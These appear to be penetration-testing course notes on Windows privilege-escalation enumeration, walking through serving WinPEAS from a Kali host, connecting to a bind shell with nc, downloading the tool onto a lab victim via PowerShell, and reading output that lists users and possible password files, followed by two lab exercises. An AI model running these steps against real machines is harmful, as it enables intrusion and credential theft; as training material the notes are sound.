# Automated Enumeration

Copy WinPEAS to our home directory and start Python3 web server
>``` shell
>kali@kali:~$ cp /usr/share/peass/winpeas/winPEASx64.exe
>
>kali@kali:~$ python3 -m http.server 80
>
># ========== Expected Result ==========
>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
># =====================================
>```

Connect to the bind shell and transfer the WinPEAS binary to CLIENTWK220
>``` shell
>kali@kali:~$ nc 192.168.50.220 4444
>
># ========== Expected Result ==========
>Microsoft Windows [Version 10.0.22000.318]
>(c) Microsoft Corporation. All rights reserved.
># =====================================
>
>C:\Users\dave> powershell
>
># ========== Expected Result ==========
>powershell
>Windows PowerShell
>Copyright (C) Microsoft Corporation. All rights reserved.
>
>Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
># =====================================
>
>PS C:\Users\dave> iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
>
># ========== Expected Result ==========
>iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
># =====================================
>```

Output legend of winPEAS
>``` shell
>C:\Users\dave> .\winPEAS.exe
>
># ========== Expected Result ==========
>...
>+] Legend:
>         Red                Indicates a special privilege over an object or something is misconfigured
>         Green              Indicates that some protection is enabled or something is well configured
>         Cyan               Indicates active users
>         Blue               Indicates disabled users
>         LightYellow        Indicates links
># =====================================
>```

Basic System Information of winPEAS
>``` shell
>...
>����������͹ Basic System Information
>� Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits    OS Name: Microsoft Windows 11 Pro
>    OS Version: 10.0.22621 N/A Build 22621
>    System Type: x64-based PC
>    Hostname: clientwk220
>    ProductName: Windows 10 Pro
>    EditionID: Professional
>    ReleaseId: 2009
>    BuildBranch: ni_release
>    CurrentMajorVersionNumber: 10
>    CurrentVersion: 6.3
>    Architecture: AMD64
>    ProcessorCount: 2
>    SystemLang: en-US
>    KeyboardLang: English (United States)
>    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
>    IsVirtualMachine: True
>    Current Time: 9/2/2024 11:03:33 PM
>    HighIntegrity: False
>    PartOfDomain: False
>    Hotfixes: 
>...
>```

List of transcript files
>``` shell
>...    
>����������͹ PS default transcripts history
>� Read the PS history inside these files (if any)
>...
>```

User information
>``` shell
>����������͹ Users
>...    
>Current user: dave
>Current groups: Domain Users, Everyone, helpdesk, Builtin\Remote Desktop Users, Users, Batch, Console Logon, Authenticated Users, This Organization, Local account, Local, NTLM Authentication
>
>   CLIENTWK220\Administrator(Disabled): Built-in account for administering the computer/domain
>        |->Groups: Administrators
>        |->Password: CanChange-NotExpi-Req
>
>    CLIENTWK220\BackupAdmin
>        |->Groups: BackupUsers,Administrators,Users
>        |->Password: CanChange-NotExpi-Req
>
>    CLIENTWK220\dave: dave
>        |->Groups: helpdesk,Remote Desktop Users,Users
>        |->Password: CanChange-NotExpi-Req
>
>    CLIENTWK220\daveadmin
>        |->Groups: adminteam,Administrators,Remote Management Users,Users
>        |->Password: CanChange-NotExpi-Req
>...
>
>    CLIENTWK220\steve
>        |->Groups: helpdesk,Remote Desktop Users,Remote Management Users,Users
>        |->Password: CanChange-NotExpi-Req
>...
>```

Possible password files in home directory of dave
>``` shell
>...    
>����������͹ Looking for possible password files in users homes
>�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
>    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
>    C:\Users\dave\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView\ZxcvbnData\3.0.0.0\passwords.txt
>    C:\Users\dave\AppData\Local\Packages\MicrosoftTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\ZxcvbnData\3.0.0.0\passwords.txt
>...
>```

Lab 1 - Follow the steps from this section and examine the output headlined Checking for DPAPI Master Files. Enter one of the MasterKeys as answer.
>``` shell
>
>```
>

Lab 2 - Download a precompiled version of Seatbelt or compile it yourself. To find a precompiled version of Seatbelt, you can enter the search term compiled seatbelt github download in a search engine. Transfer the binary to VM #1 and launch it with the option -group=all. Find a section named InstalledProducts and locate the entry for XAMPP. Enter the value of DisplayVersion as answer to this exercise.
>``` shell
>
>```
>
